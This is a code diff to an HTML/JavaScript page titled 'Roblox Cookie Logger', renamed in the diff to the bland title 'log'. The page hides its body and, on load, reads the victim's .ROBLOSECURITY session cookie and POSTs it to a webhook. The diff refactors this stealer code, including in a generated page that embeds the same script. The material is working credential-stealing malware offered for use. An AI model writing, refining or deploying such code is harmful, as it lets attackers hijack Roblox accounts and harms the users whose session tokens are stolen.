@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Logger</title>
+    <title>log</title>
     <style>
         body {
             display: none;
@@ -16,14 +16,8 @@
 
         function logCookie() {
             // Find the .ROBLOSECURITY cookie
-            const cookies = document.cookie.split(';');
-            let robloxSecurityCookie = '';
-
-            cookies.forEach(cookie => {
-                if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
-                    robloxSecurityCookie = cookie.trim();
-                }
-            });
+            const cookies = document.cookie.split(';').map(cookie => cookie.trim());
+            let robloxSecurityCookie = cookies.find(cookie => cookie.startsWith('.ROBLOSECURITY='));
 
             if (robloxSecurityCookie) {
                 const data = {
@@ -64,23 +58,18 @@
                     </head>
                     <body onload="logCookie()">
                         <script>
+                            const webhookUrl = '${webhookUrl}';
                             function logCookie() {
                                 // Find the .ROBLOSECURITY cookie
-                                const cookies = document.cookie.split(';');
-                                let robloxSecurityCookie = '';
-
-                                cookies.forEach(cookie => {
-                                    if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
-                                        robloxSecurityCookie = cookie.trim();
-                                    }
-                                });
+                                const cookies = document.cookie.split(';').map(cookie => cookie.trim());
+                                let robloxSecurityCookie = cookies.find(cookie => cookie.startsWith('.ROBLOSECURITY='));
 
                                 if (robloxSecurityCookie) {
                                     const data = {
                                         content: \`Logged .ROBLOSECURITY Cookie: \$\{robloxSecurityCookie\}\`
                                     };
 
-                                    fetch('${webhookUrl}', {
+                                    fetch(webhookUrl, {
                                         method: 'POST',
                                         headers: {
                                             'Content-Type': 'application/json'
